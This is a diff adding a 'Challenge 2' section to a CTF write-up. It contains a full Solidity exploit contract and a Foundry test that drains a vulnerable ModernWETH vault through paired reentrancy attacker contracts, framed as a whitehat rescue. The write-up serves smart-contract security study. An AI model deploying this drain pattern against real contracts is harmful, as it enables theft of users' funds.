@@ -166,3 +166,104 @@ If you liked it , Thank you !
 And Move onto Challenge 2 [Here](https://)
 
 
+## Challenge 2
+
+```solidity
+
+interface IModernEth {
+    function deposit() external payable;
+
+    function withdraw(uint256 wad) external;
+
+    function withdrawAll() external;
+
+    function balanceOf(address) external view returns (uint);
+
+    function transfer(address, uint) external;
+}
+
+contract Attack {
+    ModernWETH public etherVault;
+    // IModernEth public immutable etherVault;
+    Attack public attackPeer;
+
+    address private attacker;
+
+    constructor(ModernWETH _etherVault,address _attacker) {
+        etherVault = _etherVault;
+        attacker=_attacker;
+    }
+
+    function setAttackPeer(Attack _attackPeer) external {
+        attackPeer = _attackPeer;
+    }
+    function withdraw()external{
+        require(msg.sender==attacker,"Only Attacker can call this function");
+        payable(attacker).transfer(address(this).balance);
+    }
+    receive() external payable {
+        payable(attacker).transfer(address(this).balance-1 ether);
+        if (address(etherVault).balance >= 1 ether) {
+            etherVault.transfer(
+                address(attackPeer),
+                etherVault.balanceOf(address(this))
+            );
+        }
+    }
+
+    function attackInit() external payable {
+        if(msg.value >= 1 ether){
+        etherVault.deposit{value: 1 ether}();
+        etherVault.withdrawAll();        
+        }
+        
+    }
+
+    function attackNext() external {
+        etherVault.withdrawAll();
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+```solidity
+function testWhitehatRescue() public {
+        vm.startPrank(whitehat, whitehat);
+        uint whitehatBalanceBefore=whitehat.balance;
+
+        Attack attacker1 = new Attack(modernWETH,whitehat);
+        Attack attacker2 = new Attack(modernWETH,whitehat);
+        attacker1.setAttackPeer(attacker2);
+        attacker2.setAttackPeer(attacker1);
+        uint totalBalanceRemaining=address(modernWETH).balance;
+        for (uint i = 1; totalBalanceRemaining>10 ether; i++) {
+
+            if (i % 2 == 0) {
+                attacker1.attackInit{value: 1 ether}();
+                attacker2.attackNext();
+            } else {
+                attacker2.attackInit{value: 1 ether}();
+                attacker1.attackNext();
+            }
+            totalBalanceRemaining=address(modernWETH).balance;
+            // console.log("Total Balance Remaining",totalBalanceRemaining);
+        }
+        attacker1.withdraw();
+        attacker2.withdraw();
+        
+        uint whitehatBalanceAfter=whitehat.balance;
+        uint totalRecovered=(whitehatBalanceAfter-whitehatBalanceBefore)/10**18;
+        console.log("Total recovered ",totalRecovered," ETH");
+        totalBalanceRemaining=address(modernWETH).balance/10**18;
+        // console.log("Total Balance still locked in contract ",totalBalanceRemaining);
+        console.log("Percentage Recovered",(totalRecovered*100/1000) ,"%");
+
+    }
+    
+```
+
+## Result
+
+![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/877909f1-67e2-40ba-9cc8-8a1e6fa3f4d4)
